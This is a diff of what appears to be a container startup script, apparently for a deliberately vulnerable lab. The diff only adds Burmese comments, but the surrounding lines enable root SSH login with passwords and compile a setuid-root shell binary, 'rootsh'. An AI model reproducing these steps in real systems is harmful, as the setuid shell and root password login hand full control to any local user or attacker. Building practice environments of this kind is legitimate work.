@@ -9,6 +9,7 @@ sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd
 sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
 sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config
 
+# Subsystem sftp အားလုံးကို ဖျက်ပြီး အသစ်တစ်ခုထည့်ပါ
 sed -i '/^Subsystem sftp/d' /etc/ssh/sshd_config
 echo "Subsystem sftp internal-sftp" >> /etc/ssh/sshd_config
 
@@ -46,5 +47,8 @@ EOF
 gcc /tmp/rootsh.c -o /usr/local/bin/rootsh
 chmod u+s /usr/local/bin/rootsh
 
+# Cron ကို background မှာ run
 cron -f &
+
+# SSH daemon ကို foreground မှာ run
 exec /usr/sbin/sshd -D -e
